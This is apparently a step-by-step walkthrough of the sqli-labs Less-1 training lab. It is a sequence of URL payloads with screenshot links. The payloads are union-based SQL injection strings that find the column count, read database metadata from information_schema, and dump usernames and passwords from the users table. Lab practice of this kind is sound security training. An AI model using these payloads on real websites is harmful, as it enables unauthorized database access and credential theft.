
```
http://10.10.10.171/sqli-labs/Less-1/?id=1
```

<img src="https://i.imgur.com/18hCpK2.png">

```
http://10.10.10.171/sqli-labs/Less-1/?id=1'
```

<img src='https://i.imgur.com/htJkkqN.png'>

```
http://10.10.10.171/sqli-labs/Less-1/?id=0' union select 1'
```

<img src="https://i.imgur.com/hJEtyJh.png">

<img src"https://i.imgur.com/MJUNkIL.png">


```
http://10.10.10.171/sqli-labs/Less-1/?id=0'  union select 1,2,3'
```

<img src="https://i.imgur.com/w8wwEZG.png">

```
http://10.10.10.171/sqli-labs/Less-1/?id=0' union select 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version())'
```

<img src="https://i.imgur.com/FwMAvfG.png">

```
http://10.10.10.171/sqli-labs/Less-1/?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' '
```

<img src='https://i.imgur.com/OE9zG48.png'>


```
http://10.10.10.171/sqli-labs/Less-1/?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name = 'users' '
```

<img src='https://i.imgur.com/d2BOwTQ.png'>

```
http://10.10.10.171/sqli-labs/Less-1/?id=0' union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from users %23
```

<img src="https://i.imgur.com/Q4WuHPN.png">